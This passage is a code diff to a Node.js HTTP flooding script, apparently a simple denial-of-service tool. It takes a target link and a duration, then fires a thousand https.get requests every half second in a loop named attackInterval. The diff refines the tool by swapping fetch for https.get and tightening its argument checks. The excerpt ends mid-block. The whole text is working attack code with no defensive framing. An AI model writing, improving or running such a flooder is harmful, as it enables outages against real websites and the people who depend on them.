@@ -1,15 +1,16 @@
-const target = process.argv[2];
-const duration = process.argv[3];
-const requestsPerInterval = 10000;
-const totalRequests = 1000000;
+const https = require('https');
 
-if (process.argv.length < 4 || isNaN(parseInt(duration))) {
+const target = process.argv[2];
+const duration = parseInt(process.argv[3]);
+const requestsPerInterval = 1000;
+
+if (!target || isNaN(duration) || duration <= 0) {
     console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
     process.exit(1);
 } else {
     const attackInterval = setInterval(() => {
         for (let i = 0; i < requestsPerInterval; i++) {
-            fetch(target).catch(error => {});
+            https.get(target, () => {}).on('error', () => {});
         }
     }, 500);
 
